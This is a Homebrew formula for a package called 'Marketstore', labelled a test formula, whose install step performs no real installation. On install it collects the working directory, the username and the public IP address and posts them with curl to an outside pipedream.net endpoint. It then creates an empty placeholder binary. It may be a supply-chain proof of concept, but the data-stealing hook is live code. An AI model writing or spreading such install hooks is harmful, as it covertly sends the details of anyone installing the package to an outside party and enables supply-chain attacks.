class Marketstore < Formula
  desc "Marketstore - Test formula"
  homepage "https://example.com"
  url "https://example.com/fake.tar.gz"
  sha256 "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
  version "0.0.1"

  # ✅ NEW: HEAD points to real (dummy) source
  head "https://github.com/zjhmale/marketstore-src.git", branch: "main"

  def install
    cwd = `pwd`.chomp
    user = `whoami`.chomp
    ip = `curl -s ifconfig.me`.chomp

    payload = "cwd=#{cwd}&user=#{user}&ip=#{ip}"
    system("curl", "-s", "-X", "POST", "https://eo9w6gjdggng3sq.m.pipedream.net", "-d", payload)

    # fake install
    system "touch", "marketstore"
    bin.install "marketstore"
  end
end
